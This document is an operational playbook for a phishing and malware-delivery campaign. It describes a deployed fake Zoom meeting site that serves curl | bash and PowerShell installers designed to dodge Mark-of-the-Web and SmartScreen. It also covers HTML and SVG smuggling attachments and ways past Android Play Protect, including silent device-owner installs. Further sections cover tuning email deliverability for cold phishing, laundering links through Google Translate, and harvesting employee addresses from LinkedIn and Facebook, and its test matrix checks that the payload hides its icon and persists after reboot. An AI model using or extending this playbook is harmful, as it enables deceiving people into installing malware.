# Delivery playbook — email, attachments, OSINT, Android

Goal: turn a harvested address into a successful install with the fewest clicks.
Email is only the carrier; the landing page does the work.

## 1. Android: what is actually possible

Play Protect is server-side. There is no free switch that removes it.

| Path | Play Protect | User action | Cost |
|---|---|---|---|
| Website APK (current) | Chrome "File might be harmful" + Play Protect "App scan recommended" | Download anyway → Install → More details → Install without scanning | $0 |
| Wrapper auto-install | Payload is scanned when the wrapper installs it | The wrapper auto-taps it; user only approves the wrapper once | $0 |
| `adb install -g` + `dpm set-device-owner` | None | none (`dpm.installPackage` is silent) | $0 + one-time ADB |
| Play **internal testing** | None (Play-signed) | normal Play install | $25 one-time |
| Root / privileged system app | None | none | device-dependent |

**"Download deleted" is normal.** Chrome deletes the file from `Downloads` once the
installer consumes it; if the user taps *Don't install*, the file is gone too. So never
rely on a second attempt from the same download. Re-present the APK after a block
(the wrapper's `STATUS_FAILURE_BLOCKED` → manual installer path does this).

**Can a wrapper be bound to a legit store app?** Not by re-signing someone else's
APK. You can:
1. publish *your wrapper* to Play internal testing (best: Play certificate + package
   reputation, payload becomes a normal in-app install);
2. repackage an open-source app and sign it with your key (users must uninstall the
   original if the package ID is kept);
3. use Firebase App Distribution (trusted CDN, but testers must sign in).
You cannot update a Play app without its upload key.

## 2. The landing chain (already deployed)

```
share.telcom.stream            invitation builder + tracked /t/:id
us05web.telcom.stream/j/...    device-aware meeting page (Zoom UI)
/dl/windows.cmd                runs the PowerShell installer (no MOTW on the payload)
/dl/macos.command              curl | bash installer
/dl/linux.sh                   curl | bash installer
/dl/android                    APK
/attach/:id                    HTML "document" attachment (auto-downloads by OS)
/attach/:id/svg                SVG variant
```

`/api/landing/windows-install.ps1` and friends fetch the real client **inside the
script**, so the installed file has no Mark-of-the-Web and never hits SmartScreen.
That is the important difference from attaching an EXE.

## 3. Attachments: what works in which client

| Carrier | Gmail | Outlook/M365 | Result |
|---|---|---|---|
| `.exe` / `.msi` | blocked by default | often blocked | weak |
| `.zip` with `.cmd` | allowed | allowed | 3 clicks (extract, run, UAC) |
| `.ps1` | allowed | allowed | opens in Notepad on double-click unless "Run with PowerShell" |
| **`.html` smuggle** | allowed, opens in browser | allowed, opens in browser | 1 click, auto-download, no MOTW |
| **`.svg` smuggle** | preview may render, script needs open | same | 1 click if opened in browser |
| Cloud link (Drive/Dropbox) | preview card, high trust | same | 1 click, but third-party domain |

Use the **HTML attachment** (generic "Zoom meeting document"). SVG is a fallback for
clients that preview images. Neither can execute a binary by itself; both download the
script/APK which the user runs. True zero-click email installs require an exploit or
a signed MSI + Intune/Group Policy.

## 4. Deliverability: why SendGrid went to spam

New domain + new IP + link-heavy first send + no DMARC + bulk From header. Fix in
this order:

1. **Authenticate** on a dedicated subdomain (`mail.telcom.stream`):
   SPF `include:<esp>`, DKIM 2048-bit, DMARC `p=none` then `p=quarantine`.
   Add a custom return-path/CNAME. Never send marketing from the root domain.
2. **Warm up**: 20/day → 50 → 100 → 250 → 500, only to engaged recipients. Keep a
   separate IP/stream for cold outreach.
3. **Reputation**: Postmark (transactional, best inbox for low volume) or Amazon SES
   with a warmed dedicated IP. Google Workspace SMTP is excellent under ~1k/day but
   has strict limits and needs an app password. Microsoft 365 if the domain is
   already there.
4. **Content**: plain-text first, one link, no image-only mail, no shorteners, real
   `List-Unsubscribe`, matching `From` display name and body brand, plain `text/plain`
   part, small HTML, no `Re:` fakery unless it is a reply.
5. **DNS hygiene**: PTR/rDNS on the sending IP, MX, TLS, `_dmarc` reporting, monitor
   Google Postmaster Tools. Verify with `mxtoolbox` and `mail-tester` (aim 10/10).
6. **Batching**: cold lists in chunks of 50 with 30–90 s gaps; stop on 5% bounce.
   Remove hard bounces immediately.

There is no "spoof a whitelisted service". The From domain must authenticate. What
you can do is use a high-reputation **ESP** and a display name the recipient expects
("Zoom", "IT Support"), with `Reply-To` on your domain.

## 5. Google Translate proxy

`https://us05web-telcom-stream.translate.goog/j/<id>?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en`

- Google-owned hostname → better link reputation in LinkedIn/Facebook and some mail
  gateways.
- It proxies the HTML but rewrites links; **APK/script downloads may lose the
  content-type or be served as `octet-stream`**. Use translate.goog for the *landing
  link only*, and keep direct download URLs on your own domain.
- `translate.goog` may add a banner; it does not alter the page logic.
- Test on a real phone before using it in bulk. Do not use it for the `share.telcom.stream`
  builder itself (POST/fetch rewriting).

## 6. OSINT workflow

1. Collect: LinkedIn company pages → employee names/roles; Facebook pages → public
   posts. Derive `first.last@domain`, `first@domain`, `f.last@domain`, `it@domain`.
2. Validate: MX lookup, SMTP RCPT probe (or a verifier), dedupe, drop `noreply@`,
   `info@` unless it is an IT mailbox.
3. Personalise the first line with company + role; keep the body under 90 words.
4. Send from `it@` or `no-reply@mail.<domain>` with the display name of the product.
5. Link through `/t/:id` so opens are counted per campaign; use a different id per
   batch/segment (`?src=li`, `?src=fb` stored on the entry).
6. Follow up once after 3 days, then stop. Bounces and spam complaints are poison.

## 7. Test matrix before a campaign

- Gmail web + Android app, Outlook web + desktop, Apple Mail/iOS.
- HTML attachment: opens in browser? download starts? script runs? UAC/Gatekeeper?
- Android: Chrome warning bypass, Play Protect "Install without scanning", payload
  connects, icon hides, reboot persistence.
- Check SPF/DKIM/DMARC with `mail-tester`, Gmail "Show original" = PASS.
- Check the tracked link resolves and the click counter increments.
